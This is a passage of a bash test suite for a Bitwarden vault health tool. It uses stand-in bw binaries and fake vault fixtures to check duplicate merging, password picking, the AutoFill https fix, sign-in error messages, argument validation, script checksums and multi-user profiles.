[ "$(sv d7a .deletedDate)" = "null" ] && [ "$(sv d7b .deletedDate)" != "null" ] && [ "$(sv d7a '.login.fido2Credentials | length')" = "1" ] || { echo "FAIL the older copy holding the passkey must be kept, with its passkey"; exit 1; }
[ "$(sv d9b .deletedDate)" = "null" ] && [ "$(sv d9a .deletedDate)" != "null" ] || { echo "FAIL login.shop.co.uk and www.shop.co.uk must merge into the newest copy"; exit 1; }
[ "$(/usr/bin/jq '[.[] | select(.id | test("^(d5|d6)")) | select(.deletedDate == null)] | length' "$WORK/state-site.json")" = "4" ] && ! grep -qE '^(edit|delete) item (d5|d6)' "$WORK/bw-site.log" || { echo "FAIL the github.io pair or the field-clash pair was touched"; exit 1; }
pass "merge groups by registrable domain: one bank across subdomains, a co.uk pair, never two github.io sites"

# The AutoFill fix adds an https:// twin of each http:// address, same match setting, and touches nothing else.
fv() { /usr/bin/jq -c --arg id "$1" ".[] | select(.id == \$id) | $2" "$WORK/state-fix.json"; }
cp "$FX/dashboard.json" "$WORK/state-fix.json"; cp "$WORK/state-fix.json" "$WORK/state-fix-before.json"; : >"$WORK/bw-fix.log"
fixurls() { ( STATE="$WORK/state-fix.json"; BWLOG="$WORK/bw-fix.log"; dedupe "$1" fixurls "${@:2}" ); }
fixurls "$WORK/tty-no" >"$WORK/fx1.log" 2>&1 || { cat "$WORK/fx1.log"; echo "FAIL AutoFill fix dry run"; exit 1; }
expect "$WORK/fx1.log" '^1 login\(s\) to change, 1 left alone' "the AutoFill fix counts what it would change"
expect "$WORK/fx1.log" 'Left alone: 1 holds a passkey: add its https:// address by hand in Bitwarden' "a login holding a passkey is left alone, with what to do instead"
expect "$WORK/fx1.log" 'Nothing was changed' "an AutoFill dry run changes nothing"
! grep -q 'x=1' "$WORK/fx1.log" "$PLANS/plan-fixurls.md" || { echo "FAIL a query string reached the AutoFill preview or plan"; exit 1; }
if fixurls "$WORK/tty-yes" --apply >"$WORK/fx2.log" 2>&1; then echo "FAIL the AutoFill fix accepted DEDUPE as its confirmation"; exit 1; fi
expect "$WORK/fx2.log" 'Type FIXURLS to continue' "the AutoFill fix asks for its own word"
cmp -s "$WORK/state-fix.json" "$WORK/state-fix-before.json" && ! grep -qE '^(edit|delete) ' "$WORK/bw-fix.log" || { echo "FAIL the AutoFill fix changed the vault without FIXURLS"; exit 1; }
printf 'FIXURLS\n' >"$WORK/tty-fixurls"
fixurls "$WORK/tty-fixurls" --apply >"$WORK/fx3.log" 2>&1 || { cat "$WORK/fx3.log"; echo "FAIL AutoFill fix apply"; exit 1; }
expect "$WORK/fx3.log" '\[1/1\] oldsite.test \(s\): added the https:// address$' "the AutoFill fix reports each login"
[ "$(fv d8 '[.login.uris[] | [.uri, .match]]')" = '[["http://shop.oldsite.test/login",null],["http://shop.oldsite.test/account?x=1",3],["https://shop.oldsite.test/login",null],["https://shop.oldsite.test/account?x=1",3]]' ] || { fv d8 .login.uris; echo "FAIL each http:// address must gain its https:// twin with the same match setting, the original kept"; exit 1; }
[ "$(fv d8 'del(.login.uris)')" = "$(/usr/bin/jq -c '.[] | select(.id == "d8") | del(.login.uris)' "$WORK/state-fix-before.json")" ] || { echo "FAIL the AutoFill fix changed something besides the addresses"; exit 1; }
[ "$(/usr/bin/jq -c 'map(select(.id != "d8"))' "$WORK/state-fix.json")" = "$(/usr/bin/jq -c 'map(select(.id != "d8"))' "$WORK/state-fix-before.json")" ] || { echo "FAIL the AutoFill fix touched another login (a passkey holder, a device or an app)"; exit 1; }
[ "$(grep -c '^get item d8$' "$WORK/bw-fix.log")" = "1" ] && ! grep -q '^delete' "$WORK/bw-fix.log" || { cat "$WORK/bw-fix.log"; echo "FAIL the AutoFill edit must be read back, and nothing deleted"; exit 1; }
cp "$FX/dashboard.json" "$WORK/state-fix.json"
if ( FAKE_BW_EDIT_BUG=drop-https fixurls "$WORK/tty-fixurls" --apply >"$WORK/fx4.log" 2>&1 ); then cat "$WORK/fx4.log"; echo "FAIL the run went on after bw dropped the https:// address"; exit 1; fi
expect "$WORK/fx4.log" 'bw saved a different web addresses' "an https:// address that did not come back is caught by the read-back"
pass "the AutoFill fix adds https:// twins only after FIXURLS, reads them back, and leaves passkeys alone"

# --- dedupe pick: groups whose only conflict is different passwords ----------------------------------
# Bank one (b1): b1a's password changed most recently, though b1b was edited later and is the kept copy.
# k1: the passkey copy holds the older password. s1: skipped with Enter. w1: the kept copy's own password
# is picked, so no edit. x1 (seeds), y1 (a field), y2 (history) and y3 (a match setting) also differ by
# password and stay left alone, as does b4 (seeds only). Zoom (m2) is for the merge stage. Cannot catch the real
# bw reporting passwordRevisionDate differently from this model.
expect "$WORK/dd2.log" 'different passwords: dedupe pick' "exact and merge point to the pick stage for different-password groups"
/usr/bin/jq '[.[] | select(.id | test("^(b1|b4|m2)"))] | map(if .id == "b1a" then .creationDate = "2025-12-01T00:00:00Z" elif .id == "b1b" then .creationDate = "2024-01-01T00:00:00Z" | .login.passwordRevisionDate = "2025-06-01T00:00:00Z" | .passwordHistory = [{"lastUsedDate":"2025-06-01T00:00:00Z","password":"PW-secret-b1-older"}] else . end) + [
  {"id":"k1a","type":1,"organizationId":null,"name":"Kay","notes":null,"folderId":null,"favorite":false,"reprompt":0,"creationDate":"2025-01-01T00:00:00Z","revisionDate":"2025-06-01T00:00:00Z","deletedDate":null,"fields":[],"login":{"username":"k@x.com","password":"PW-secret-k1-old","passwordRevisionDate":null,"totp":null,"fido2Credentials":[{"credentialId":"cred-k1","keyValue":"KEYDATA-k1","rpId":"k1.example.com"}],"uris":[{"match":null,"uri":"https://k1.example.com"}]}},
  {"id":"k1b","type":1,"organizationId":null,"name":"Kay","notes":null,"folderId":null,"favorite":false,"reprompt":0,"creationDate":"2026-04-01T09:30:00Z","revisionDate":"2026-04-02T00:00:00Z","deletedDate":null,"fields":[],"login":{"username":"k@x.com","password":"PW-secret-k1-new","passwordRevisionDate":null,"totp":null,"uris":[{"match":null,"uri":"https://k1.example.com"},{"match":null,"uri":"https://login.k1.example.com"}]}},
  {"id":"s1a","type":1,"organizationId":null,"name":"Odd folder","notes":null,"folderId":"fA","favorite":false,"reprompt":0,"creationDate":"2025-06-01T00:00:00Z","revisionDate":"2026-01-01T00:00:00Z","deletedDate":null,"fields":[],"login":{"username":"s@x.com","password":"PW-secret-s1-a","totp":null,"uris":[{"match":null,"uri":"https://s1.example.com"}]}},
  {"id":"s1b","type":1,"organizationId":null,"name":"Odd folder","notes":null,"folderId":null,"favorite":false,"reprompt":0,"creationDate":"2024-01-01T00:00:00Z","revisionDate":"2026-02-01T00:00:00Z","deletedDate":null,"fields":[],"passwordHistory":[{"lastUsedDate":"2026-01-15T00:00:00Z","password":"PW-secret-s1-older"}],"login":{"username":"s@x.com","password":"PW-secret-s1-b","passwordRevisionDate":"2026-01-15T00:00:00Z","totp":null,"uris":[{"match":null,"uri":"https://s1.example.com"}]}},
  {"id":"s1c","type":1,"organizationId":null,"name":"Odd folder","notes":null,"folderId":null,"favorite":false,"reprompt":0,"creationDate":"2025-01-01T00:00:00Z","revisionDate":"2025-12-01T00:00:00Z","deletedDate":null,"fields":[],"login":{"username":"s@x.com","password":"","totp":null,"uris":[{"match":null,"uri":"https://s1.example.com"}]}},
  {"id":"y1a","type":1,"organizationId":null,"name":"Field clash","notes":null,"folderId":null,"favorite":false,"reprompt":0,"revisionDate":"2026-01-01T00:00:00Z","fields":[{"name":"pin","value":"1111","type":0}],"deletedDate":null,"login":{"username":"y1@x.com","password":"PW-secret-y1-a","totp":null,"uris":[{"match":null,"uri":"https://y1.example.com"}]}},
  {"id":"y1b","type":1,"organizationId":null,"name":"Field clash","notes":null,"folderId":null,"favorite":false,"reprompt":0,"revisionDate":"2026-02-01T00:00:00Z","fields":[{"name":"pin","value":"2222","type":0}],"deletedDate":null,"login":{"username":"y1@x.com","password":"PW-secret-y1-b","totp":null,"uris":[{"match":null,"uri":"https://y1.example.com"}]}},
  {"id":"y2a","type":1,"organizationId":null,"name":"History gap","notes":null,"folderId":null,"favorite":false,"reprompt":0,"revisionDate":"2026-01-01T00:00:00Z","fields":[],"passwordHistory":[{"lastUsedDate":"2025-01-01T00:00:00Z","password":"PW-secret-y2-older"}],"deletedDate":null,"login":{"username":"y2@x.com","password":"PW-secret-y2-a","totp":null,"uris":[{"match":null,"uri":"https://y2.example.com"}]}},
  {"id":"y2b","type":1,"organizationId":null,"name":"History gap","notes":null,"folderId":null,"favorite":false,"reprompt":0,"revisionDate":"2026-02-01T00:00:00Z","fields":[],"deletedDate":null,"login":{"username":"y2@x.com","password":"PW-secret-y2-b","totp":null,"uris":[{"match":null,"uri":"https://y2.example.com"}]}},
  {"id":"y3a","type":1,"organizationId":null,"name":"Match clash","notes":null,"folderId":null,"favorite":false,"reprompt":0,"revisionDate":"2026-01-01T00:00:00Z","fields":[],"deletedDate":null,"login":{"username":"y3@x.com","password":"PW-secret-y3-a","totp":null,"uris":[{"match":null,"uri":"https://y3.example.com"}]}},
  {"id":"y3b","type":1,"organizationId":null,"name":"Match clash","notes":null,"folderId":null,"favorite":false,"reprompt":0,"revisionDate":"2026-02-01T00:00:00Z","fields":[],"deletedDate":null,"login":{"username":"y3@x.com","password":"PW-secret-y3-b","totp":null,"uris":[{"match":3,"uri":"https://y3.example.com"}]}},
  {"id":"w1a","type":1,"organizationId":null,"name":"Own pick","notes":null,"folderId":null,"favorite":false,"reprompt":0,"creationDate":"2025-01-01T00:00:00Z","revisionDate":"2026-01-01T00:00:00Z","fields":[],"deletedDate":null,"login":{"username":"w@x.com","password":"PW-secret-w1-a","totp":null,"uris":[{"match":null,"uri":"https://w1.example.com"}]}},
  {"id":"w1b","type":1,"organizationId":null,"name":"Own pick","notes":null,"folderId":null,"favorite":false,"reprompt":0,"creationDate":"2026-03-01T00:00:00Z","revisionDate":"2026-03-01T00:00:00Z","fields":[],"deletedDate":null,"login":{"username":"w@x.com","password":"PW-secret-w1-b","totp":null,"uris":[{"match":null,"uri":"https://w1.example.com"}]}},
  {"id":"x1a","type":1,"organizationId":null,"name":"Both","notes":null,"folderId":null,"favorite":false,"reprompt":0,"revisionDate":"2026-01-01T00:00:00Z","deletedDate":null,"fields":[],"login":{"username":"x@x.com","password":"PW-secret-x1-a","totp":"otpauth://totp/x?secret=AAAA","uris":[{"match":null,"uri":"https://x1.example.com"}]}},
  {"id":"x1b","type":1,"organizationId":null,"name":"Both","notes":null,"folderId":null,"favorite":false,"reprompt":0,"revisionDate":"2026-02-01T00:00:00Z","deletedDate":null,"fields":[],"login":{"username":"x@x.com","password":"PW-secret-x1-b","totp":"otpauth://totp/x?secret=BBBB","uris":[{"match":null,"uri":"https://x1.example.com"}]}}]' "$FX/dupes.json" >"$WORK/state-pick.json"
cp "$WORK/state-pick.json" "$WORK/state-pick-before.json"
pick() { # pick <tty file> <log> <args...>
  local tty="$1" log="$2"; shift 2
  ( STATE="$WORK/state-pick.json"; BWLOG="$WORK/bw-pick.log"; export TZ="${PICK_TZ:-UTC}"; dedupe "$tty" pick "$@" >"$log" 2>&1 )
}
: >"$WORK/bw-pick.log"
pick "$WORK/tty-no" "$WORK/pk1.log" || { cat "$WORK/pk1.log"; echo "FAIL pick dry run"; exit 1; }
expect "$WORK/pk1.log" '^4 group\(s\) to change, 5 left alone, 1 for another stage' "pick counts only groups whose sole conflict is the password"
for why in '2 different one-time-code seeds' '1 a custom field with different values' '1 a copy has password history the kept copy lacks' '1 the same URL with different match settings'; do
  expect "$WORK/pk1.log" "Left alone:.*$why" "different passwords plus another conflict stays left alone with that reason: $why"
done
expect "$WORK/pk1.log" '^ +1 +"Bank one" +folder: no folder +edited 2026-01-01 00:00, created 2025-12-01 00:00$' "a copy created after the other's last password change is listed first, dates in local time"
expect "$WORK/pk1.log" '^ +2 +"Bank one" +folder: no folder +password changed 2025-06-01 00:00, edited 2026-02-01 00:00, created 2024-01-01 00:00 +\(kept entry\)$' "an older password change ranks second though edited later; every date bw reports is shown"
expect "$WORK/pk1.log" '^ +1 +"Kay" .*edited 2026-04-02 00:00, created 2026-04-01 09:30$' "a never-changed password ranks by its copy's creation date"
expect "$WORK/pk1.log" '^ +1 +"Odd folder" +folder: no folder +password changed 2026-01-15 00:00.*\(kept entry\)$' "a recent password change ranks above copies created earlier"
expect "$PLANS/plan-pick.md" '^\| example.com \(k@x.com\) \| 2 \|.*\| the password you choose; \+1 URL' "the pick plan says what the kept copy gains besides the password"
expect "$WORK/pk1.log" '^ +2 +"Kay" .*\(kept entry, holds a passkey\)$' "the passkey copy is the kept entry even with the older password"
expect "$WORK/pk1.log" 'Nothing was changed' "a pick dry run changes nothing"
cmp -s "$WORK/state-pick.json" "$WORK/state-pick-before.json" && ! grep -qE '^(edit|delete) ' "$WORK/bw-pick.log" || { echo "FAIL a pick dry run changed the vault"; exit 1; }
PICK_TZ=America/New_York pick "$WORK/tty-no" "$WORK/pk5.log" || { cat "$WORK/pk5.log"; echo "FAIL pick dry run in New York time"; exit 1; }
expect "$WORK/pk5.log" '^ +1 +"Bank one" +folder: no folder +edited 2025-12-31 19:00, created 2025-11-30 19:00$' "dates are shown in the person's own time zone"

printf '9\n\n3\n\n' >"$WORK/tty-skip"
pick "$WORK/tty-skip" "$WORK/pk2.log" --apply || { cat "$WORK/pk2.log"; echo "FAIL skipping every group must end cleanly"; exit 1; }
expect "$WORK/pk2.log" 'not one of the numbers shown, so this group is skipped' "an answer that is not a listed number skips the group"
expect "$WORK/pk2.log" 'That copy has no password, so this group is skipped' "choosing a copy with no password skips the group instead of blanking the password"
expect "$WORK/pk2.log" 'No group was chosen. Nothing was changed.' "skipping every group changes nothing"
! grep -q 'Type DEDUPE' "$WORK/pk2.log" || { echo "FAIL the confirmation was asked with nothing chosen"; exit 1; }
printf '0\n3\n\n' >"$WORK/tty-edges"
pick "$WORK/tty-edges" "$WORK/pk2b.log" --apply || { cat "$WORK/pk2b.log"; echo "FAIL edge answers must end cleanly"; exit 1; }
[ "$(grep -o 'not one of the numbers shown' "$WORK/pk2b.log" | wc -l | tr -d ' ')" = "2" ] || { cat "$WORK/pk2b.log"; echo "FAIL 0, and one past the last copy, must each be refused"; exit 1; }
expect "$WORK/pk2b.log" 'or press Enter to skip: Skipped\.$' "Enter skips with its own message"
printf '\n' >"$WORK/tty-enter"
pick "$WORK/tty-enter" "$WORK/pk6.log" --apply --limit 1 || { cat "$WORK/pk6.log"; echo "FAIL pick apply 1"; exit 1; }
[ "$(grep -o 'press Enter to skip: ' "$WORK/pk6.log" | wc -l | tr -d ' ')" = "1" ] || { echo "FAIL apply 1 must ask about one group only"; exit 1; }
printf '1\n1\n\n1\nno\n' >"$WORK/tty-pick-no"
if pick "$WORK/tty-pick-no" "$WORK/pk3.log" --apply; then echo "FAIL pick went ahead without the confirmation word"; exit 1; fi
expect "$WORK/pk3.log" 'This will edit 2 kept copies and move 3 copies to the Bitwarden trash' "pick states the edits and the trashing before the confirmation"
cmp -s "$WORK/state-pick.json" "$WORK/state-pick-before.json" && ! grep -qE '^(edit|delete) ' "$WORK/bw-pick.log" || { echo "FAIL an unconfirmed pick changed the vault"; exit 1; }
pass "pick ranks by password date, previews, and changes nothing until a group is chosen and DEDUPE typed"

printf '1\n1\n\n1\nDEDUPE\n' >"$WORK/tty-pick"
pick "$WORK/tty-pick" "$WORK/pk4.log" --apply || { cat "$WORK/pk4.log"; echo "FAIL pick apply"; exit 1; }
pv() { /usr/bin/jq -r --arg id "$1" ".[] | select(.id == \$id) | $2" "$WORK/state-pick.json"; }
[ "$(pv b1b .login.password)" = "PW-secret-b1-old" ] && [ "$(pv b1a .deletedDate)" != "null" ] && [ "$(pv b1b .deletedDate)" = "null" ] || { echo "FAIL the chosen password was not saved on the kept copy, or the other copy not trashed"; exit 1; }
[ "$(pv k1a .login.password)" = "PW-secret-k1-new" ] && [ "$(pv k1a '.login.fido2Credentials[0].keyValue')" = "KEYDATA-k1" ] && [ "$(pv k1b .deletedDate)" != "null" ] || { echo "FAIL the passkey copy must keep its passkey and take the chosen password"; exit 1; }
[ "$(pv s1a .deletedDate)" = "null" ] && [ "$(pv s1b .deletedDate)" = "null" ] && [ "$(pv s1a .login.password)" = "PW-secret-s1-a" ] || { echo "FAIL a skipped group was changed"; exit 1; }
[ "$(/usr/bin/jq '[.[] | select(.id | test("^(x1|y|b4|m2)")) | select(.deletedDate == null)] | length' "$WORK/state-pick.json")" = "12" ] && ! grep -qE '^(edit|delete) item (x1|y|b4|m2|s1)' "$WORK/bw-pick.log" || { echo "FAIL pick touched a group it does not act on"; exit 1; }
[ "$(pv w1b .login.password)" = "PW-secret-w1-b" ] && [ "$(pv w1a .deletedDate)" != "null" ] && ! grep -q '^edit item w1' "$WORK/bw-pick.log" || { echo "FAIL picking the kept copy's own password must trash the rest without an edit"; exit 1; }
[ "$(grep -c '^get item' "$WORK/bw-pick.log")" = "2" ] || { echo "FAIL every pick edit must be read back"; exit 1; }
! grep -q 'PW-secret\|KEYDATA' "$WORK/pk1.log" "$WORK/pk2.log" "$WORK/pk3.log" "$WORK/pk4.log" "$WORK/pk5.log" "$WORK/pk2b.log" "$WORK/pk6.log" "$PLANS/plan-pick.md" || { echo "FAIL a password or passkey key reached the terminal or the plan"; exit 1; }
pass "pick saves the chosen password on the kept copy, keeps a passkey, trashes the rest, and leaves skipped groups alone"

# The entry point refuses a bad dedupe request before it asks for a master password. Cannot catch
# a valid request misbehaving after sign-in; that needs a real vault.
for bad in "bogus" "exact later" "exact 5" "exact apply 1 extra" "exact apply abc" "merge apply 0"; do
  # shellcheck disable=SC2086
  if HOME="$FAKE_HOME" BW_HEALTH_BASE_URL="file://$ROOT" /bin/bash bw-health.sh dedupe $bad >"$WORK/dd-arg.log" 2>&1; then
    cat "$WORK/dd-arg.log"; echo "FAIL 'dedupe $bad' was accepted"; exit 1
  fi
  ! grep -q 'master password' "$WORK/dd-arg.log" || { echo "FAIL 'dedupe $bad' reached sign-in"; exit 1; }
done
expect "$WORK/dd-arg.log" 'a limit goes after apply' "a bad limit is explained"
pass "bad dedupe requests are refused before sign-in"

# A mistyped master password gets a plain explanation, not only Bitwarden's developer error lines. Cannot catch
# the real bw's wording or exit status; only that a failing unlock or login is explained in plain words.
PW_HOME="$WORK/pw-home"
mkdir -p "$PW_HOME/.local/bin" "$PW_HOME/Desktop" "$PW_HOME/Library/Application Support/bw-health/bin"
ln -s "$FAKE_HOME/.local/bin/uv" "$PW_HOME/.local/bin/uv"
cat >"$PW_HOME/Library/Application Support/bw-health/bin/bw" <<'EOF'
#!/bin/bash
case "$1" in
  status) echo "{\"status\":\"$FAKE_BW_STATUS\"}" ;;
  unlock) echo "ERROR bitwarden_crypto::keys::master_key: error=The decryption operation failed" >&2; exit 1 ;;
  login) echo "Username or password is incorrect. Try again." >&2; exit 1 ;;
esac
EOF
chmod +x "$PW_HOME/Library/Application Support/bw-health/bin/bw"
printf 'x\n' >"$WORK/tty-pw"
for state in locked unauthenticated; do
  if HOME="$PW_HOME" BW_HEALTH_BASE_URL="file://$ROOT" BW_HEALTH_TTY="$WORK/tty-pw" FAKE_BW_STATUS="$state" /bin/bash bw-health.sh >"$WORK/pw-$state.log" 2>&1; then
    cat "$WORK/pw-$state.log"; echo "FAIL a failed sign-in ($state) exited successfully"; exit 1
  fi
  ! grep -q 'Send a screenshot' "$WORK/pw-$state.log" || { cat "$WORK/pw-$state.log"; echo "FAIL a mistyped password must not be told to send a screenshot ($state)"; exit 1; }
  expect "$WORK/pw-$state.log" 'Nothing in your vault was changed' "a failed sign-in ($state) says nothing was changed"
  expect "$WORK/pw-$state.log" 'Caps Lock' "a failed sign-in ($state) names the usual cause"
done
expect "$WORK/pw-locked.log" 'did not unlock your Bitwarden vault' "a failed unlock says so in plain words"
expect "$WORK/pw-locked.log" 'decryption operation failed' "the developer error is still shown, for whoever helps"
expect "$WORK/pw-locked.log" 'stop after two tries' "a failed unlock tells people when to stop"
expect "$WORK/pw-unauthenticated.log" 'Sign-in did not complete' "a failed first sign-in says so in plain words"
pass "a failed sign-in or unlock is explained in plain words"
if HOME="$PW_HOME" BW_HEALTH_BASE_URL="file://$ROOT" BW_HEALTH_TTY="$WORK/tty-pw" FAKE_BW_STATUS=locked /bin/bash bw-health.sh dedupe pick apply 2 >"$WORK/pw-pick.log" 2>&1; then
  echo "FAIL the locked stand-in vault unlocked"; exit 1
fi
expect "$WORK/pw-pick.log" 'did not unlock your Bitwarden vault' "the entry point accepts 'dedupe pick apply 2' and goes on to sign-in"

# --- a bad request is refused before anything is installed, fetched or asked ------------------------
EMPTY_HOME="$WORK/empty-home"; mkdir "$EMPTY_HOME"
refuse() { # refuse <regex> <args...>
  local want="$1"; shift
  if HOME="$EMPTY_HOME" BW_HEALTH_BASE_URL="file://$ROOT" /bin/bash bw-health.sh "$@" >"$WORK/refuse.log" 2>&1; then
    cat "$WORK/refuse.log"; echo "FAIL '$*' was accepted"; exit 1
  fi
  grep -qE -e "$want" "$WORK/refuse.log" || { cat "$WORK/refuse.log"; echo "FAIL '$*' was refused without saying: $want"; exit 1; }
  [ -z "$(ls -A "$EMPTY_HOME")" ] || { echo "FAIL '$*' was refused only after something was written to the home folder"; exit 1; }
}
for bad in Mom 'mom dad' ../mom -mom '' mom_1 --logout-after; do refuse 'a --user name is 1 to 32 lowercase' --user "$bad"; done
refuse 'a --user name is 1 to 32 lowercase' --user abcdefghijklmnopqrstuvwxyz0123456
refuse '--user needs a name after it' check --user
refuse '--user was given twice' --user mom --user dad
refuse 'unknown option: --usr' --usr mom
refuse 'unknown step: logut' --user mom logut
refuse 'nothing is allowed after logout' --user mom logout now
refuse '--logout-after goes with a run that signs in, not with check' check --logout-after
refuse '--logout-after goes with a run that signs in, not with logout' --user mom logout --logout-after
for bad in "fixurls now" "fixurls apply 0" "fixurls 2" "fixurls apply 1 extra"; do
  # shellcheck disable=SC2086
  refuse 'after fixurls, the only word allowed is apply|a limit goes after apply|nothing is allowed after the limit' $bad
done
refuse '--summary-only goes with the check-up itself, not with dedupe' --summary-only dedupe merge
refuse '--summary-only goes with the check-up itself, not with fixurls' --user mom fixurls --summary-only
pass "a bad profile name, option or step is refused before anything is installed"

# --- where the report scripts come from --------------------------------------------------------------
# A copy of the checkout with a marked script. Run as a file with no BW_HEALTH_BASE_URL it must use the
# files beside it, and only once the marked file's checksum is written in the copy's own entry script.
# Cannot catch the published copies being fetched as well and then overwritten.
# shellcheck disable=SC2086
mkdir "$WORK/clone" "$WORK/clone2"; cp bw-health.sh $FILES "$WORK/clone/"; cp bw-health.sh $FILES "$WORK/clone2/"
echo '# marked local copy' >>"$WORK/clone/bw_report.py"
if env -u BW_HEALTH_BASE_URL HOME="$FAKE_HOME" /bin/bash "$WORK/clone/bw-health.sh" check >"$WORK/local0.log" 2>&1; then echo "FAIL a changed local script was used without its checksum"; exit 1; fi
expect "$WORK/local0.log" 'bw_report.py did not match the checksum written in bw-health.sh, so it was not used. If you changed it, update its checksum' "a changed script beside the file is refused until its checksum is updated"
sed -i '' "s/$(shasum -a 256 bw_report.py | cut -d' ' -f1)/$(shasum -a 256 "$WORK/clone/bw_report.py" | cut -d' ' -f1)/" "$WORK/clone/bw-health.sh"
env -u BW_HEALTH_BASE_URL HOME="$FAKE_HOME" /bin/bash "$WORK/clone/bw-health.sh" check >"$WORK/local.log" 2>&1 || { cat "$WORK/local.log"; echo "FAIL check from a checkout"; exit 1; }
expect "$WORK/local.log" "^==> bw-health v$VERSION, using the report scripts beside this file" "a run from a checkout says it uses its own scripts"
! grep -q 'curl -fsSL' "$WORK/local.log" || { echo "FAIL a run from a checkout showed the paste line as if it were the release"; exit 1; }
# Only the marked copy matches the clone's pinned checksum, so the clean check above proves it was the one used.
! compgen -G "$APP/run.*" >/dev/null || { ls "$APP"; echo "FAIL a run from a checkout left its scripts folder behind"; exit 1; }
# The unmarked copy, pointed at the marked one: it must fetch from there (and so refuse it), not use its own files.
if HOME="$FAKE_HOME" BW_HEALTH_BASE_URL="file://$WORK/clone" /bin/bash "$WORK/clone2/bw-health.sh" check >"$WORK/local2.log" 2>&1; then echo "FAIL BW_HEALTH_BASE_URL did not win over the files beside the script"; exit 1; fi
expect "$WORK/local2.log" 'Fetching the report scripts' "BW_HEALTH_BASE_URL still wins over the files beside the script"
expect "$WORK/local2.log" 'bw_report.py did not match the checksum' "and what it serves is checked like any other source"
rm "$WORK/clone/bw_dedupe.py"
if env -u BW_HEALTH_BASE_URL HOME="$FAKE_HOME" /bin/bash "$WORK/clone/bw-health.sh" check >"$WORK/local3.log" 2>&1; then echo "FAIL a checkout missing a script was accepted"; exit 1; fi
expect "$WORK/local3.log" "only some of this tool's files are beside bw-health.sh" "a checkout missing one file is refused, not topped up from the published ones"
HOME="$FAKE_HOME" BW_HEALTH_BASE_URL="file://$ROOT" /bin/bash -s -- --user mom check <bw-health.sh >"$WORK/piped.log" 2>&1 || { cat "$WORK/piped.log"; echo "FAIL piped check with --user"; exit 1; }
expect "$WORK/piped.log" 'Installed OK' "--user works on the paste line (bash -s -- --user NAME)"
[ -d "$APP/profiles/mom/data" ] || { echo "FAIL a piped --user run did not use the profile's folder"; exit 1; }
pass "a checkout runs its own files; the paste line and BW_HEALTH_BASE_URL fetch them; every source is checksummed"

# --- several people on one Mac account: --user NAME ---------------------------------------------------
# A stand-in bw that keeps its sign-in in the data folder it is pointed at, as the real one does, and
# serves a different vault per account. `open` is a stand-in too, so no browser or Finder window opens.
# Cannot catch the real bw signing in, locking or signing out differently from this model.
MU_HOME="$WORK/mu-home"; MU_APP="$MU_HOME/Library/Application Support/bw-health"; MU_DL="$MU_HOME/Downloads"
MOM="$MU_APP/profiles/mom"; DAD="$MU_APP/profiles/dad"; MU_BWLOG="$WORK/mu-bw.log"; MU_OPENLOG="$WORK/mu-open.log"
mkdir -p "$MU_HOME/.local/bin" "$MU_HOME/Desktop" "$MU_DL" "$MU_APP/bin" "$WORK/mu-bin" "$WORK/vaults"
ln -s "$FAKE_HOME/.local/bin/uv" "$MU_HOME/.local/bin/uv"
cat >"$MU_APP/bin/bw" <<'EOF'
#!/bin/bash
D="$BITWARDENCLI_APPDATA_DIR"
echo "${D#*/bw-health/} $*" >>"$FAKE_BW_LOG"
case "$1" in
  status)
    if [ -f "$D/account" ]; then
      state=locked; [ -z "${BW_SESSION:-}" ] || state=unlocked
      echo "{\"status\":\"$state\",\"userEmail\":\"$(cat "$D/account")\"}"
    else
      echo '{"status":"unauthenticated","userEmail":null}'
    fi ;;
  login)
    [ ! -f "$D/account" ] || { echo "You are already logged in." >&2; exit 1; }
    echo "$FAKE_BW_EMAIL" >"$D/account"; echo "session-key" ;;
  unlock) [ -f "$D/account" ] || { echo "You are not logged in." >&2; exit 1; }; echo "session-key" ;;
  lock) ;;
  logout)
    [ -f "$D/account" ] || { echo "You are not logged in." >&2; exit 1; }
    case "${FAKE_BW_LOGOUT_BUG:-}" in
      fails) echo "Logout failed." >&2; exit 1 ;;
      silent) ;;
      *) rm "$D/account" ;;
    esac ;;
  sync) echo 'Syncing complete.' ;;
  list)
    case "$#:$2" in
      2:items) cat "$FAKE_BW_VAULTS/$(cat "$D/account").json" ;;
      2:folders) cat "$FAKE_BW_FOLDERS" ;;
      *) echo "Invalid command: $*" >&2; exit 1 ;;
    esac ;;
  *) echo "Invalid command: $*" >&2; exit 1 ;;
esac
EOF
printf '#!/bin/bash\necho "$*" >>"$FAKE_OPEN_LOG"\n' >"$WORK/mu-bin/open"
chmod +x "$MU_APP/bin/bw" "$WORK/mu-bin/open"
cp "$FX/items.json" "$WORK/vaults/mom@example.com.json"
cp "$FX/items.json" "$WORK/vaults/owner@example.com.json"
cp "$FX/dupes.json" "$WORK/vaults/kelly@example.com.json"
echo '[{"id":"d1","type":1,"name":"Dad bank","deletedDate":null,"login":{"username":"dad","password":"Vt6#qLp9$wZ3mK8x!r","uris":[{"uri":"https://dadbank.example.com"}]}}]' >"$WORK/vaults/dad@example.com.json"
UV_CACHE="$(uv cache dir)"; UV_PYTHONS="$(uv python dir)"  # the stand-in home must not download Python again
: >"$MU_BWLOG"; : >"$MU_OPENLOG"
mu() { # mu <account email> <tty file> <args...>: one run from this checkout, with its own scripts
  local email="$1" tty="$2"; shift 2
  env -u BW_SESSION -u BW_HEALTH_BASE_URL HOME="$MU_HOME" PATH="$WORK/mu-bin:$PATH" UV_CACHE_DIR="$UV_CACHE" UV_PYTHON_INSTALL_DIR="$UV_PYTHONS" \
    BW_HEALTH_TTY="$tty" FAKE_BW_EMAIL="$email" FAKE_BW_LOG="$MU_BWLOG" FAKE_BW_VAULTS="$WORK/vaults" FAKE_BW_FOLDERS="$FX/folders.json" \
    FAKE_OPEN_LOG="$MU_OPENLOG" /bin/bash bw-health.sh "$@"
}
snapshot() { ( cd "$1" && find . -type f -exec shasum {} + | sort ); } # every file under a folder, with its hash
newest_report() { ls "$1/Reports"/Bitwarden\ Report*.html | tail -1; }  # <a person's bw-health folder>
bw_calls_since() { tail -n "+$(($1 + 1))" "$MU_BWLOG"; }                # <line count before a run>

# Both people's exports are in Downloads at once: the case that used to mix one into the other's vault.
cp "$FX/chrome.csv" "$MU_DL/Google Passwords.csv"
APPLE_STAMP="$(date -v-1H +%Y%m%d%H%M)"; APPLE_DAY="$(date -j -f %Y%m%d%H%M "$APPLE_STAMP" +%Y-%m-%d)"  # an hour ago is yesterday just after midnight
cp "$FX/apple.csv" "$MU_DL/Passwords.csv"; touch -t "$APPLE_STAMP" "$MU_DL/Passwords.csv"
cp "$FX/chrome2.csv" "$MU_DL/Old Passwords.csv"; touch -t "$(date -v-10d +%Y%m%d%H%M)" "$MU_DL/Old Passwords.csv"
printf 'url,title\nhttps://x.com,not a password file\n' >"$MU_DL/other.csv"

